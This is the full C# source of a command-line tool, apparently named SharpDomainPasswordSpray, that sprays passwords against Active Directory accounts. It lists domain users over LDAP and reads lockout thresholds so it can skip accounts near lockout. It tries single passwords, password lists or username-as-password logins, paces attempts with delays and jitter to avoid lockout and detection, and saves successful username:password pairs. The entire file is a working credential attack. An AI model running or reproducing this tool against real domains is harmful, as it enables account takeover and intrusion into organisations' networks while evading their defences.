using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;

namespace SharpDomainPasswordSpray
{
    class Program
    {
        static void Main(string[] args)
        {
            var parser = new CommandLineParser(args);

            // Show usage if no args or help flag
            if (args.Length == 0 || parser.GetFlag("h") || parser.GetFlag("help"))
            {
                ShowUsage();
                return;
            }

            string userList = parser.GetValue("UserList", "");
            string password = parser.GetValue("Password", "");
            string passwordList = parser.GetValue("PasswordList", "");
            string outFile = parser.GetValue("OutFile", "");
            string filter = parser.GetValue("Filter", "");
            string domain = parser.GetValue("Domain", "");
            bool force = parser.GetFlag("Force");
            bool usernameAsPassword = parser.GetFlag("UsernameAsPassword");
            bool getUsersOnly = parser.GetFlag("GetUsers");
            int delay = parser.GetInt("Delay", 0);
            double jitter = parser.GetDouble("Jitter", 0);
            bool quiet = parser.GetFlag("Quiet");
            int fudge = parser.GetInt("Fudge", 10);

            string currentDomainPath;
            try
            {
                using (var rootDSE = new DirectoryEntry($"LDAP://{(string.IsNullOrEmpty(domain) ? "RootDSE" : domain + "/RootDSE")}"))
                {
                    string dn = (string)rootDSE.Properties["defaultNamingContext"].Value;
                    currentDomainPath = "LDAP://" + dn;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Could not connect to the domain: {ex.Message}");
                return;
            }

            // --- OPTION: Get Users Only ---
            if (getUsersOnly)
            {
                Console.WriteLine("[*] Mode: User Discovery Only");
                var discoveredUsers = GetDomainUserList(currentDomainPath, true, true, filter);
                if (discoveredUsers != null && discoveredUsers.Count > 0)
                {
                    string exportFile = string.IsNullOrEmpty(outFile) ? "discovered_users.txt" : outFile;
                    File.WriteAllLines(exportFile, discoveredUsers);
                    Console.WriteLine($"[*] Successfully wrote {discoveredUsers.Count} users to {exportFile}");
                }
                return;
            }

            // --- Spray Logic ---
            List<string> passwords = new List<string>();
            if (!string.IsNullOrEmpty(password)) passwords.Add(password);
            else if (usernameAsPassword) { /* Handled in SpraySinglePassword */ }
            else if (!string.IsNullOrEmpty(passwordList))
            {
                if (File.Exists(passwordList)) passwords = new List<string>(File.ReadAllLines(passwordList));
                else { Console.WriteLine($"[!] Password list not found: {passwordList}"); return; }
            }
            else { Console.WriteLine("[!] Error: -Password, -PasswordList, or -UsernameAsPassword must be specified."); return; }

            List<string> userListArray;
            if (string.IsNullOrEmpty(userList))
            {
                userListArray = GetDomainUserList(currentDomainPath, true, true, filter);
            }
            else
            {
                if (File.Exists(userList))
                {
                    Console.WriteLine($"[*] Using {userList} as userlist to spray.");
                    userListArray = new List<string>(File.ReadAllLines(userList));
                }
                else { Console.WriteLine($"[!] User list not found: {userList}"); return; }
            }

            if (userListArray == null || userListArray.Count == 0) { Console.WriteLine("[!] No users found to spray."); return; }

            int observationWindow = GetObservationWindow(currentDomainPath);
            Console.WriteLine($"[*] Password policy observation window: {observationWindow} minutes.");

            if (!force)
            {
                Console.WriteLine($"[*] Targets: {userListArray.Count} accounts. Proceed? (Y/N)");
                if (Console.ReadLine().ToUpper() != "Y") return;
            }

            if (usernameAsPassword)
            {
                SpraySinglePassword(currentDomainPath, userListArray, null, outFile, delay, jitter, true, quiet);
            }
            else
            {
                for (int i = 0; i < passwords.Count; i++)
                {
                    SpraySinglePassword(currentDomainPath, userListArray, passwords[i], outFile, delay, jitter, false, quiet);
                    if (i + 1 < passwords.Count) CountdownTimer(observationWindow * 60 + fudge, quiet);
                }
            }
            Console.WriteLine("[*] Done.");
        }

        static void ShowUsage()
        {
            Console.WriteLine(@"
SharpDomainPasswordSpray - AD Password Spraying Tool

Usage:
  .\SharpDomainPasswordSpray.exe -Password <pass> [options]
  .\SharpDomainPasswordSpray.exe -PasswordList <file> [options]
  .\SharpDomainPasswordSpray.exe -GetUsers -OutFile users.txt

Arguments:
  -Password         A single password to spray.
  -PasswordList     Path to a file containing passwords (one per line).
  -UserList         Path to a file containing usernames (optional). 
                    If omitted, the tool queries the domain for users.
  -Domain           The FQDN of the domain (e.g., corp.local).
  -GetUsers         Flag to ONLY gather a list of users and exit.
  -OutFile          File to write successful logins or discovered users.
  -Filter           Additional LDAP filter for user discovery.
  -UsernameAsPassword  Use the username as the password for each account.
  -Delay            Seconds to wait between each user attempt (default: 0).
  -Jitter           Percentage of jitter for delay (0.0 to 1.0).
  -Force            Skip the 'Are you sure?' confirmation.
  -Quiet            Minimize console output.
  -Fudge            Seconds to add to the lockout window timer (default: 10).
            ");
        }

        static void CountdownTimer(int seconds, bool quiet)
        {
            string message = "[*] Pausing to avoid account lockout.";
            for (int count = 0; count < seconds; count++)
            {
                if (!quiet) Console.Write($"\r{message} {seconds - count}s remaining...       ");
                Thread.Sleep(1000);
            }
            Console.WriteLine();
        }

        static List<string> GetDomainUserList(string domainPath, bool removeDisabled, bool removePotentialLockouts, string filter)
        {
            var userListArray = new List<string>();
            try
            {
                using (var deDomain = new DirectoryEntry(domainPath))
                {
                    var thresholds = new List<int> { (int)deDomain.Properties["lockoutthreshold"].Value };
                    int observationWindow = GetObservationWindow(domainPath);

                    // Search for Fine-Grained Password Policies (PSOs)
                    using (var searcher = new DirectorySearcher(deDomain) { Filter = "(objectclass=msDS-PasswordSettings)" })
                    {
                        foreach (SearchResult entry in searcher.FindAll())
                        {
                            thresholds.Add((int)entry.Properties["msds-lockoutthreshold"][0]);
                        }
                    }

                    int smallestThreshold = thresholds.Where(t => t > 0).DefaultIfEmpty(0).Min();
                    Console.WriteLine(smallestThreshold == 0 ? "[*] No lockout policy detected." : $"[*] Smallest lockout threshold: {smallestThreshold}");

                    using (var userSearcher = new DirectorySearcher(deDomain))
                    {
                        userSearcher.Filter = removeDisabled ? $"(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2){filter})" : $"(&(objectCategory=person)(objectClass=user){filter})";
                        userSearcher.PropertiesToLoad.AddRange(new[] { "samaccountname", "badpwdcount", "badpasswordtime" });
                        userSearcher.PageSize = 1000;

                        foreach (SearchResult user in userSearcher.FindAll())
                        {
                            string name = (string)user.Properties["samaccountname"][0];
                            if (removePotentialLockouts && smallestThreshold > 0)
                            {
                                int badCount = user.Properties.Contains("badpwdcount") ? (int)user.Properties["badpwdcount"][0] : 0;
                                if (badCount >= smallestThreshold - 1)
                                {
                                    long lastBadTimeTicks = user.Properties.Contains("badpasswordtime") ? GetLongFromLargeInteger(user.Properties["badpasswordtime"][0]) : 0;
                                    if (lastBadTimeTicks > 0)
                                    {
                                        var lastBad = DateTime.FromFileTime(lastBadTimeTicks);
                                        if ((DateTime.Now - lastBad).TotalMinutes < observationWindow) continue;
                                    }
                                }
                            }
                            userListArray.Add(name);
                        }
                    }
                }
            }
            catch (Exception ex) { Console.WriteLine($"[!] Error gathering users: {ex.Message}"); }
            return userListArray;
        }

        static void SpraySinglePassword(string domainPath, List<string> userListArray, string password, string outFile, int delay, double jitter, bool userAsPass, bool quiet)
        {
            Console.WriteLine($"[*] Spraying password: {(userAsPass ? "[Username]" : password)}");
            var rand = new Random();
            int success = 0;

            for (int i = 0; i < userListArray.Count; i++)
            {
                string user = userListArray[i];
                string pass = userAsPass ? user : password;

                // DirectoryEntry is "lazy". It doesn't authenticate until you access a property.
                using (var authEntry = new DirectoryEntry(domainPath, user, pass))
                {
                    try
                    {
                        // Accessing NativeObject forces authentication
                        object obj = authEntry.NativeObject;
                        Console.WriteLine($"\n[+] SUCCESS: {user}:{pass}");
                        if (!string.IsNullOrEmpty(outFile)) File.AppendAllText(outFile, $"{user}:{pass}{Environment.NewLine}");
                        success++;
                    }
                    catch (COMException) { /* Auth failed */ }
                }

                if (!quiet) Console.Write($"\r[*] Progress: {i + 1}/{userListArray.Count} (Successes: {success})");
                if (delay > 0 && i < userListArray.Count - 1)
                    Thread.Sleep(rand.Next((int)((1 - jitter) * delay), (int)((1 + jitter) * delay + 1)) * 1000);
            }
            Console.WriteLine();
        }

        static int GetObservationWindow(string domainEntry)
        {
            using (var de = new DirectoryEntry(domainEntry))
            {
                object val = de.Properties["lockoutObservationWindow"].Value;
                long ticks = GetLongFromLargeInteger(val);
                // AD stores intervals as negative 100-nanosecond slices
                return (int)(Math.Abs(ticks) / 600000000);
            }
        }

        // Helper to handle the IADsLargeInteger COM object
        static long GetLongFromLargeInteger(object largeInteger)
        {
            if (largeInteger == null) return 0;
            try
            {
                var type = largeInteger.GetType();
                int high = (int)type.InvokeMember("HighPart", System.Reflection.BindingFlags.GetProperty, null, largeInteger, null);
                int low = (int)type.InvokeMember("LowPart", System.Reflection.BindingFlags.GetProperty, null, largeInteger, null);
                return ((long)high << 32) | (uint)low;
            }
            catch
            {
                return (largeInteger is long l) ? l : 0;
            }
        }
    }

    class CommandLineParser
    {
        private Dictionary<string, string> _args = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        public CommandLineParser(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("-"))
                {
                    string key = args[i].Substring(1);
                    if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                    {
                        _args[key] = args[i + 1];
                        i++;
                    }
                    else { _args[key] = "true"; }
                }
            }
        }
        public string GetValue(string key, string def) => _args.ContainsKey(key) ? _args[key] : def;
        public bool GetFlag(string key) => _args.ContainsKey(key);
        public int GetInt(string key, int def) => _args.ContainsKey(key) && int.TryParse(_args[key], out int v) ? v : def;
        public double GetDouble(string key, double def) => _args.ContainsKey(key) && double.TryParse(_args[key], out double v) ? v : def;
    }
}